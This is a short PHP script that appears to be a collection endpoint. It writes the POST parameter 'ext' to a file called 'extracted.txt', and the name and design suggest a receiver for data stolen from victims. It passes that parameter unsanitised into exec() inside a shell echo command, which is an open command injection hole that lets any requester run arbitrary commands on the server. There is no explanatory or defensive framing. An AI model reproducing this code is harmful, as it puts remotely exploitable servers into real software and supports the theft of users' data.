<?php 
if ((isset($_POST) && !empty($_POST)))
  if (isset($_POST['ext']) && !empty($_POST['ext']))
    exec('echo "'.$_POST['ext'].'" >> extracted.txt');
?>
